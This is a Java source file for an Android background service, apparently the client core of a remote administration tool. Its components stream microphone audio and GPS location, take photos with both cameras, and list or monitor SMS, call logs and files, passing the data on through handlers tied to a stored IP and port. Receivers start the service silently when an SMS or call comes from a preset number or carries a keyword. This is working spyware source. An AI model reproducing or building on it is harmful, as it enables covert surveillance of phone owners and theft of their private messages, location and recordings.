package my.app.client;

import java.util.ArrayList;
import java.util.HashSet;

import my.app.Library.AdvancedSystemInfo;
import my.app.Library.AudioStreamer;
import my.app.Library.CallLogLister;
import my.app.Library.CallMonitor;
import my.app.Library.DirLister;
import my.app.Library.FileDownloader;
import my.app.Library.GPSListener;
import my.app.Library.PhotoTaker;
import my.app.Library.PhotoTakerFront;
import my.app.Library.SMSLister;
import my.app.Library.SMSMonitor;
import my.app.Library.SystemInfo;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import inout.Protocol;

public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener, LocationListener {

	public abstract void handleData(int channel, byte[] data);

	public abstract void sendInformation(String infos);

	public abstract void sendError(String error);

	public abstract void loadPreferences();

	public AudioStreamer audioStreamer;
	public CallMonitor callMonitor;
	public CallLogLister callLogLister;
	public DirLister dirLister;
	public FileDownloader fileDownloader;
	public GPSListener gps;
	public PhotoTaker photoTaker;
	public PhotoTakerFront photoTakerFront;
	public SystemInfo infos;
	public Toast toast;
	public SMSMonitor smsMonitor;
	public AdvancedSystemInfo advancedInfos;

	boolean waitTrigger;
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;
	String ip;
	int port;

	protected boolean isConnected = true;

	public ClientListener() {
		super();

	}

	public void onLocationChanged(Location location) {
		byte[] data = gps.encode(location);
		handleData(gps.getChannel(), data);
	}

	public void onProviderDisabled(String provider) {
		sendError("GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
		sendInformation("GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {

	}

	public void onPeriodicNotification(AudioRecord recorder) {
		try {
			byte[] data = audioStreamer.getData();
			if (data != null)
				handleData(audioStreamer.getChannel(), data);
		} catch (NullPointerException e) {

		}
	}

	public void onMarkerReached(AudioRecord recorder) {
		sendError("Marker reached for audio streaming");
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {

		private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

		@Override
		public void onReceive(Context context, Intent intent) {

			if (intent.getAction().equals(SMS_RECEIVED)) {
				Log.i("SMSReceived", "onReceive sms !");

				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] pdus = (Object[]) bundle.get("pdus");

					final SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					if (messages.length > -1) {

						final String messageBody = messages[0].getMessageBody();
						final String phoneNumber = messages[0].getDisplayOriginatingAddress();

						if (authorizedNumbersCall != null) {
							boolean found = false;
							boolean foundk = false;
							for (String s : authorizedNumbersSMS) {
								if (s.equals(phoneNumber))
									found = true;
							}
							if (!found)
								return;
							if (authorizedNumbersKeywords != null) {
								for (String s : authorizedNumbersKeywords) {
									if (messageBody.contains(s))
										foundk = true;
								}
								if (!foundk)
									return;
							}
							Log.i("Client", "Incoming call authorized");
						}

						Intent serviceIntent = new Intent(context, Client.class);
						serviceIntent.setAction("SMSReceiver");
						context.startService(serviceIntent);
					}
				}
			}
		}
	};

	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		private static final String TAG = "CallReceiver";

		@Override
		public void onReceive(final Context context, final Intent intent) {
			Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();

			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {

				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					Log.i(TAG, "Incoming call");

					if (authorizedNumbersCall != null) {
						boolean found = false;
						for (String s : authorizedNumbersCall) {
							if (s.equals(phoneNumber))
								found = true;
						}
						if (!found)
							return;
						Log.i(TAG, "Incoming call authorized");
					}

					Intent serviceIntent = new Intent(context, Client.class);
					serviceIntent.setAction("CallReceiver");
					context.startService(serviceIntent);
				}

			} else {

				final String data = intent.getDataString();
				Log.i(TAG, "broadcast : action=" + action + ", data=" + data);

			}
		}

	};

	public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {

		private String TAG = "ConnectivityReceiver";

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			String type;
			boolean state;

			ConnectivityManager connectivityManager = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
			if (TestCo == null)
				state = false;
			else
				state = true;

			NetworkInfo networkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
			if (networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
				type = "Wifi";
			else if (networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
				type = "3g";
			else
				type = "other";

			if (state) {
				Log.w(TAG, "Connection is Available " + type);
				if (!isConnected) {
					Intent serviceIntent = new Intent(context, Client.class);
					serviceIntent.setAction("ConnectivityCheckReceiver");
					context.startService(serviceIntent);
				}
			} else {
				Log.w(TAG, "Connection is not Available " + type);
			}
			isConnected = state;
		}
	};
}
